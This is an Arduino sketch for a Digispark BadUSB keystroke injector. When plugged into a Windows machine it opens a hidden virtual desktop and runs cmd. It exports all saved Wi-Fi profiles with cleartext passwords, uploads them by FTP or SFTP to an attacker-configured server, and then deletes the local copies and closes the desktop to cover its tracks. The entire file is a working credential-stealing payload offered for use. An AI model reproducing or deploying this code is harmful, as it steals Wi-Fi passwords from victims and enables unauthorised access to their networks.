// Written by @ahmkrby

#define kbd_tr_tr   //Türkçe klavye kullanmıyorsanız silebilirsiniz. | //You can delete it if you are not using a Turkish keyboard.
#include "DigiKeyboard.h"

// FTP sunucunuzun bilgilerini tırnak içindeki yerlere giriniz. !! Tırnak işaretlreini silmeyiniz.
// Enter the details of your FTP server in quotation marks. !!! Do not delete the quotation marks.

String conn_type = "ftp";              // sftp ya da ftp olduğunu belirtin
String ip = "your_ftp_ip_or_domanin";
String user = "your_ftp_user";
String password = "your_ftp_password";

void setup() {
  
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(0);

}

void loop() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT | MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("mkdir passwd");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cd passwd");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("netsh wlan export profile key=clear");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cd ..");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print(conn_type);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(user);
  DigiKeyboard.print("@");
  DigiKeyboard.print(ip);
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(password);
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("yes");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("put passwd/* passwd");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("bye");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("rmdir /s passwd");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("y");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_GUI_LEFT | MOD_CONTROL_LEFT);
  DigiKeyboard.delay(10000);





}
